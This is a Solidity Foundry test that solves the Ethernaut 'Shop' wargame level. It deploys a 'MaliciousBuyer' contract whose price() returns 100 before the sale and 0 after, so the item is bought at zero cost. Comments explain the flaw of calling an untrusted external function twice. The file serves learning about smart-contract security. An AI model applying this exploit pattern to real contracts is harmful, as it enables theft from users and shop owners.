// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";

import "../levels/21-Shop/ShopFactory.sol";
import "../core/Ethernaut.sol";

contract ShopTest is Test {
    Ethernaut ethernaut;
    address attacker = makeAddr("attacker");

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(attacker, 1 ether);
    }

    function testShopHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////
        ShopFactory shopFactory = new ShopFactory();
        ethernaut.registerLevel(shopFactory);
        vm.startPrank(attacker);
        address levelAddress = ethernaut.createLevelInstance(shopFactory);
        Shop ethernautShop = Shop(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        // The buy function from the Shop use the Buyer interface to check if the price is greater than the current price
        // but also to set the price in the storage of the Shop contract.
        // It possible to read from the Shop storage to know if the first check passed thanks to the isSold variable.
        // Hence buy implementing the buy function of the Buyer interface, it possible to first set the price to 100 to pass
        // the first check and then set the price to 0 change the price in the storage of the Shop contract.

        // 1. Create a malicious buyer contract
        MaliciousBuyer maliciousBuyer = new MaliciousBuyer(ethernautShop);
        // 2. Buy from the shop
        maliciousBuyer.buyfromShop();

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract MaliciousBuyer {
    uint256 public counter;
    Shop public shop;

    constructor(Shop _shop) {
        shop = _shop;
    }

    function price() external returns (uint256) {
        if (shop.isSold() == false) return 100;
        return 0;
    }

    function buyfromShop() external {
        shop.buy();
    }
}
